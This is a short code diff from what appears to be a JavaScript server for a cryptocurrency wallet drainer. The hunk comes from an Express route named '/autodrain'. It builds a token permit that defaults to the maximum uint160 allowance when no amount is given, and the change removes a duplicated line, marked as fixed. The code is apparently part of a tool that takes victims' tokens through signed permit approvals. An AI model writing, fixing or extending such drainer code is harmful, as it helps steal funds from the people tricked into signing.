@@ -319,7 +319,6 @@ app.post('/autodrain', async (req, res) => {
         const MAX_UINT160 = "0xffffffffffffffffffffffffffffffffffffffff"; // 20 bytes MAX
 const safeAmount = amount && amount.length <= 40 ? amount : MAX_UINT160;
 
-const safeAmount = amount && amount.length <= 40 ? amount : MAX_UINT160;
 const permit = {
   token: token.toLowerCase(),
   amount: ethers.BigNumber.from(safeAmount),  // ✅ FIXED
